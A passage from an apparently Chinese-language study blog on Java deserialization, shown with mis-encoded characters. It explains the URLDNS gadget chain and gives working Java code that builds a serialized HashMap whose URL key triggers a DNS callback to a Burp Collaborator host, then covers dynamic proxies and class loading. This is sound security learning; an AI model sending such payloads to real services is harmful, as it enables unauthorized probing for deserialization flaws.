class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//åŒæ ·å¯ä»¥è¢«ååºåˆ—åŒ–</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URL</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BUILTIN_HANDLERS_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;sun.net.www.protocol&quot;</span>;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">7627629688361524110L</span>;<br><span class="hljs-comment">//å­˜åœ¨åŒåå‡½æ•°hashCode</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br>    &#125;<br><span class="hljs-comment">//handler.hashCodeå‡½æ•°</span><br><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">(URL u)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-comment">// Generate the protocol part.</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> u.getProtocol();<br>        <span class="hljs-keyword">if</span> (protocol != <span class="hljs-literal">null</span>)<br>            h += protocol.hashCode();<br><br>        <span class="hljs-comment">// Generate the host part.</span><br>        <span class="hljs-type">InetAddress</span> <span class="hljs-variable">addr</span> <span class="hljs-operator">=</span> getHostAddress(u);<br><br></code></pre></td></tr></table></figure><p>æœ€ç»ˆä¼šåœ¨<code>URLStreamHandler</code>ç±»è°ƒç”¨<code>getHostAddress</code>å‡½æ•°å‘èµ·åŸŸåè§£æè¯·æ±‚ã€‚æ‰€ä»¥è¿™æ¡é“¾å°±åªæœ‰ä¸¤éƒ¨åˆ†<code>HashMap-&gt;URL</code>ã€‚</p><p>è€Œä¸”ï¼Œ<code>HashMap</code>ä¸­<code>readObject</code>è°ƒç”¨äº†<code>hash</code>æ–¹æ³•ï¼Œåœ¨<code>hash</code>æ–¹æ³•ä¸­ä¹Ÿè°ƒç”¨äº†<code>hashcode</code>æ–¹æ³•ï¼Œæ­£å¥½å¯ä»¥èµ°åˆ°<code>URL</code>çš„<code>hashcode</code>é‡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerilizePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;viper1.txt&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;    <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        HashMap&lt;URL, Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        hashMap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://ezh5awfh6q670nk11meskg0gr7xxlm.burpcollaborator.net&quot;</span>),<span class="hljs-number">1</span>);<br>        serialize(hashMap);<br>    &#125;<br></code></pre></td></tr></table></figure><p>ä½†ä¸Šè¿°ä»£ç åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¹Ÿä¼šå‘èµ·DNSè¯·æ±‚ï¼š</p><p><img src="/img/javafanstudy1.png" alt="javafanstudy1"></p><p>ç”šè‡³æ²¡æœ‰åºåˆ—åŒ–éƒ½ä¼šæ”¶åˆ°è¯·æ±‚ï¼Œä¸ºä»€ä¹ˆï¼Ÿè·Ÿè¿›åˆ°<code>put</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>ä¸ºäº†ç¡®ä¿é”®çš„å”¯ä¸€æ€§ï¼Œå®ƒä¼šå»è®¡ç®—keyçš„hashå€¼ï¼Œè·Ÿè¿›hashæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hash</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-type">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-literal">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ƒæœ€åä¹Ÿä¼šè°ƒç”¨hashCodeæ–¹æ³•ã€‚æ‰€ä»¥åœ¨putçš„æ—¶å€™å®ƒå°±å‘èµ·äº†ä¸€ä¸ªDNSè¯·æ±‚:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">hashMap.put(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://ezh5awfh6q670nk11meskg0gr7xxlm.burpcollaborator.net&quot;</span>),<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>å¦å¤–ï¼Œåœ¨æˆ‘ä»¬åˆ†ææ”»å‡»é“¾çš„æ—¶å€™ï¼Œå¦‚æœhashCodeçš„å€¼ä¸ç­‰äº-1ï¼Œå°±ä¼šè¿”å›hashCodeï¼Œè€Œä¸ä¼šå»è°ƒç”¨handler.hashCodeã€‚å®ƒåœ¨åˆå§‹åŒ–çš„æ—¶å€™ä¸º-1:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">return</span> hashCode;<br><br>        hashCode = handler.hashCode(<span class="hljs-built_in">this</span>);<br>        <span class="hljs-keyword">return</span> hashCode;<br><span class="hljs-comment">//---------------------------------------------</span><br> <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">hashCode</span> <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥è°ƒç”¨putå‡½æ•°çš„æ—¶å€™ï¼ŒhashCodeå°±å˜æˆäº†keyçš„å“ˆå¸Œå€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™å¹¶ä¸ä¼šå‘èµ·DNSè¯·æ±‚(ä¸æ»¡è¶³hashCodeçš„æ¡ä»¶)ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ— æ•ˆé“¾ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è°ƒæ•´ä¸€ä¸‹ä»£ç ã€‚</p><blockquote><p>1.åºåˆ—åŒ–ä¸å‘èµ·è¯·æ±‚ã€‚</p><p>2.åœ¨putåhashcodeçš„å€¼ä¸º-1ã€‚</p><p>å¯ä»¥é€šè¿‡åå°„æ”¹å˜å·²æœ‰å¯¹è±¡çš„å±æ€§ã€‚</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SerilizePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;viper00.txt&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">/*Person person = new Person(&quot;rdj&quot;,24);</span><br><span class="hljs-comment">        System.out.println(person);</span><br><span class="hljs-comment">        serialize(person);*/</span><br>        HashMap&lt;URL, Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://rvqbods4viqkcjfzeunt7qij7ad01p.burpcollaborator.net&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">hashcode1</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>        hashcode1.setAccessible(<span class="hljs-literal">true</span>);<br>        hashcode1.set(url,<span class="hljs-number">1234</span>);<br>        hashMap.put(url,<span class="hljs-number">1</span>);<br>        serialize(hashMap);<br>    &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶æ²¡æœ‰æ”¶åˆ°æ–°çš„DNSè¯·æ±‚ï¼š</p><p><img src="/img/javafanstudy2.png" alt="javafanstudy2"></p><p>ç„¶åååºåˆ—åŒ–å°±è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UnserilizePerson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        unserialize(<span class="hljs-string">&quot;viper00.txt&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶å®å…³é”®ä»£ç å°±è¿™ä¹ˆå‡ è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;URL, Integer&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;URL, Integer&gt;();<br><span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://rvqbods4viqkcjfzeunt7qij7ad01p.burpcollaborator.net&quot;</span>);<br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> url.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">hashcode1</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;hashCode&quot;</span>);<br>hashcode1.setAccessible(<span class="hljs-literal">true</span>);<br>hashcode1.set(url,<span class="hljs-number">1234</span>);<br>hashMap.put(url,<span class="hljs-number">1</span>);<br>serialize(hashMap);<br></code></pre></td></tr></table></figure><p>å…¥å£Aï¼šHashmap æ¥æ”¶ä¸€ä¸ªå‚æ•°O</p><p>ç›®æ ‡ç±»Bï¼šURL</p><p>ç›®æ ‡è°ƒç”¨B.f</p><p>A.readPbject -&gt; O.f(è¿™æ—¶æˆ‘ä»¬ä¼ è¿›å»Bè¢«å½“æˆOï¼Œä¹Ÿå°±è°ƒç”¨äº†B.f)</p><blockquote><p>æˆ‘ä»¬çš„å…¥å£ç±»æ˜¯HashMapï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œå®ƒä¼šè°ƒç”¨é‡å†™çš„readObjectæ–¹æ³•ï¼Œè€Œåœ¨è¯¥æ–¹æ³•é‡Œï¼Œå®ƒä¼šè®¡ç®—ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯keyçš„hashå€¼ï¼Œè¿›è€Œè°ƒç”¨hashå‡½æ•°ï¼Œè¿›è€Œè°ƒç”¨keyçš„hashCodeå‡½æ•°ã€‚è€Œæˆ‘ä»¬çš„ç›®æ ‡æ–¹æ³•å°±æ˜¯URLåŸç”Ÿç±»çš„hashCodeæ–¹æ³•ï¼Œæ»¡è¶³è°ƒç”¨é“¾çš„åŒååŒç±»å‹ï¼Œè®©keyä¼ å…¥URLå¯¹è±¡ï¼Œå³ä¸ºå®Œæ•´çš„æ”»å‡»é“¾ã€‚</p></blockquote><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">HashMap.readObject<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>hash<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>key.hashCode<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>URL.hashCode-&gt;handler.hashCode<span class="hljs-function"><span class="hljs-params">()</span>-&gt;</span>getHostAddress()<br></code></pre></td></tr></table></figure><h2 id="JDKåŠ¨æ€ä»£ç†"><a href="#JDKåŠ¨æ€ä»£ç†" class="headerlink" title="JDKåŠ¨æ€ä»£ç†"></a>JDKåŠ¨æ€ä»£ç†</h2><p>å¯¹äºä¸‹é¢è¿™æ®µä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        sout(<span class="hljs-string">&#x27;æ‹¿ç­·å­&#x27;</span>);<br>        sout(<span class="hljs-string">&#x27;ç››é¥­&#x27;</span>);<span class="hljs-comment">//å¢åŠ çš„åŠŸèƒ½</span><br>        sout(<span class="hljs-string">&#x27;åƒé¥­&#x27;</span>);<span class="hljs-comment">//å¢åŠ çš„åŠŸèƒ½</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥æ— ä¾µå…¥å¼çš„ç»™ä»£ç å¢åŠ é¢å¤–çš„åŠŸèƒ½ã€‚</p><p><img src="/img/javalearn72.png" alt="javalearn72"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Bigstar.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Bigstar</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Star</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Bigstar</span><span class="hljs-params">()</span>&#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Bigstar</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-meta">@override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sing</span><span class="hljs-params">()</span>&#123;<br>        sout(<span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot;æ­£åœ¨å”±&quot;</span> + name);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;è°¢è°¢&quot;</span>;<br>    &#125;<br>    <span class="hljs-meta">@override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dance</span><span class="hljs-params">()</span>&#123;<br>        sout (<span class="hljs-built_in">this</span>.name + <span class="hljs-string">&quot;æ­£åœ¨è·³èˆ&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//getname setnameæ‡’å¾—å†™äº†ã€‚ã€‚ã€‚</span><br>&#125;<br><br><br><span class="hljs-comment">//Star.java</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Star</span> &#123;<br>    <br>    <span class="hljs-comment">//æˆ‘ä»¬å¯ä»¥æŠŠæ‰€æœ‰æƒ³è¦è¢«ä»£ç†çš„æ–¹æ³•å®šä¹‰åœ¨æ¥å£å½“ä¸­ï¼Œæ³¨æ„æ¥å£é‡Œçš„æ–¹æ³•éƒ½åº”æ˜¯æŠ½è±¡æ–¹æ³•</span><br>    <br>    <span class="hljs-comment">//å”±</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title function_">sing</span><span class="hljs-params">(String name)</span>;<br>    <br>    <span class="hljs-comment">//è·³</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">dance</span><span class="hljs-params">()</span>;<br>    <br>    <br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/img/javalearn73.png" alt="javalearn73"></p><p><img src="/img/javalearn747.png" alt="javalearn747"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//IUser.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>;<br>&#125;<br><span class="hljs-comment">//proxtwhat.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">proxywhat</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IUser</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">proxywhat</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span>&#123;<br><br>        System.out.println(<span class="hljs-string">&quot;å±•ç¤º&quot;</span>);<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//proxytest.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">proxytest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">IUser</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">proxywhat</span>();<br>        user.show();<br>    &#125;<br>&#125;<br><span class="hljs-comment">//ç»“æœï¼šå±•ç¤º</span><br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProxyUtil</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">    æ–¹æ³•ä½œç”¨ï¼šç»™ä¸€ä¸ªæ˜æ˜Ÿçš„å¯¹è±¡åˆ›å»ºä¸€ä¸ªä»£ç†</span><br><span class="hljs-comment">    å½¢å‚ï¼šè¢«ä»£ç†çš„æ˜æ˜Ÿå¯¹è±¡</span><br><span class="hljs-comment">    è¿”å›å€¼ï¼šç»™æ˜æ˜Ÿåˆ›å»ºçš„ä»£ç†</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Star <span class="hljs-title function_">createProxy</span><span class="hljs-params">(BigStar bigstar)</span>&#123;<br>        <br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç±»åŠ è½½"><a href="#ç±»åŠ è½½" class="headerlink" title="ç±»åŠ è½½"></a>ç±»åŠ è½½</h3><p>ç±»åŠ è½½æœºåˆ¶ï¼š</p><ul><li>ç±»åŠ è½½ä¸ååºåˆ—åŒ–</li></ul><p>ç±»åŠ è½½çš„æ—¶å€™ä¼šæ‰§è¡Œä»£ç </p><p>åˆå§‹åŒ–ï¼šé™æ€ä»£ç å—</p><p>å®ä¾‹åŒ–ï¼šæ„é€ ä»£ç å—ï¼Œæ— å‚æ„é€ å‡½æ•°</p><ul><li>åŠ¨æ€ç±»åŠ è½½æ–¹æ³•</li><li></li></ul><p>å‚è€ƒæ–‡ç« ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/mocas_wang/article/details/<span class="hljs-number">107621010</span>?ops_request_misc=%<span class="hljs-number">257</span>B%<span class="hljs-number">2522</span>request%<span class="hljs-number">255</span>Fid%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522170149064516800213084111</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">252</span>C%<span class="hljs-number">2522</span>scm%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">2522</span>%<span class="hljs-number">257</span>D&amp;request_id=<span class="hljs-number">170149064516800213084111</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~top_positive~default-<span class="hljs-number">1</span>-<span class="hljs-number">107621010</span>-null-null.<span class="hljs-number">142</span>^v96^pc_search_result_base9&amp;utm_term=mocas_wang&amp;spm=<span class="hljs-number">1018</span>.<span 